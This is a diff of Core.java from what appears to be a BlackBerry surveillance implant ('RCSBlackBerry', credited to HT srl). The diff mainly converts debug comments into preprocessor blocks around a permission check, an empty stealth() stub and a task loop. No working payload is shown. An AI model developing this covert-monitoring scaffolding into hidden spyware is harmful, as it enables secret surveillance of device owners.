@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -25,8 +26,9 @@ import blackberry.utils.Utils;
 public final class Core implements Runnable {
 
     /** The debug instance. */
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug;
+    //#endif
     private static Core instance;
 
     /**
@@ -64,18 +66,32 @@ public final class Core implements Runnable {
         Utils.sleep(1000);
         // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
 
-        // #mdebug
+        //#ifdef DEBUG
         Debug.init(true, false, false, true);
         debug = new Debug("Core", DebugLevel.VERBOSE);
         debug.trace("Core init");
-        // #enddebug
+        //#endif
 
         final boolean antennaInstalled = true;
-        // #if 1=0
-        // @ antennaInstalled = false;
-        // #endif
-        // #debug debug
-        debug.trace("Antenna: " + antennaInstalled);
+        //#ifdef DEBUG
+        System.out.println("DEBUG");
+        //#endif
+
+        //#ifdef DEBUG_TRACE
+        System.out.println("DEBUG_TRACE");
+        //#endif
+        //#ifdef DEBUG_INFO
+        System.out.println("DEBUG_INFO");
+        //#endif
+        //#ifdef DEBUG_WARN
+        System.out.println("DEBUG_WARN");
+        //#endif
+        //#ifdef DEBUG_ERROR
+        System.out.println("DEBUG_ERROR");
+        //#endif
+        //#ifdef DEBUG_FATAL
+        System.out.println("DEBUG_FATAL");
+        //#endif
 
         Encryption.init();
     }
@@ -91,9 +107,11 @@ public final class Core implements Runnable {
      * Permissions' from the menu.
      */
     private void checkPermissions() {
-        // #ifdef HAVE_PERMISSIONS
-        // #debug info
+
+        //#ifdef DEBUG_INFO
         debug.info("CheckPermissions");
+        //#endif
+
         // NOTE: This sample leverages the following permissions:
         // --Event Injector
         // --Phone
@@ -142,8 +160,10 @@ public final class Core implements Runnable {
 
         if (allPermitted) {
             // All of the necessary permissions are currently available
-            // #debug info
-            debug.info("All of the necessary permissions are currently available");
+            //#ifdef DEBUG_INFO
+            debug
+                    .info("All of the necessary permissions are currently available");
+            //#endif
             return;
         }
 
@@ -165,14 +185,15 @@ public final class Core implements Runnable {
 
         if (acceptance) {
             // User has accepted all of the permissions
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("User has accepted all of the permissions");
+            //#endif
             return;
         } else {
-            // #debug
+            //#ifdef DEBUG
             debug.warn("User has accepted some or none of the permissions");
+            //#endif
         }
-        // #endif
     }
 
     /**
@@ -182,21 +203,27 @@ public final class Core implements Runnable {
      */
     public void run() {
 
+        //#ifdef HAVE_PERMISSIONS
         checkPermissions();
+        //#endif
+
         stealth();
 
         Utils.sleep(500);
 
         for (;;) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("init task");
+            //#endif
             if (task.taskInit() == false) {
-                // #debug
+                //#ifdef DEBUG
                 debug.error("TaskInit() FAILED");
+                //#endif
                 break;
             } else {
-                // #debug debug
+                //#ifdef DEBUG_TRACE
                 debug.trace("TaskInit() OK");
+                //#endif
                 // CHECK: Status o init?
             }
 
@@ -206,29 +233,33 @@ public final class Core implements Runnable {
             // Status.getInstance().triggerAction(0, null);
             // }
 
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("starting checking actions");
+            //#endif
             if (task.checkActions() == false) {
-                // #debug
+                //#ifdef DEBUG
                 debug.error("CheckActions() [Uninstalling?] FAILED");
+                //#endif
                 // chiudere tutti i thread
                 // decidere se e' un uninstall
                 break;
             } else {
-                //#debug info
+                //#ifdef DEBUG_INFO
                 debug.info("Waiting a while before reloading");
+                //#endif
                 Utils.sleep(2000);
             }
         }
 
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("RCSBlackBerry exit ");
+        //#endif
 
-        // #debug
+        //#ifdef DEBUG
         Debug.stop();
+        //#endif
 
         Utils.sleep(2000);
-
         System.exit(0);
     }
 
@@ -237,7 +268,6 @@ public final class Core implements Runnable {
      */
     private void stealth() {
         // TODO Auto-generated method stub
-
     }
 
 }
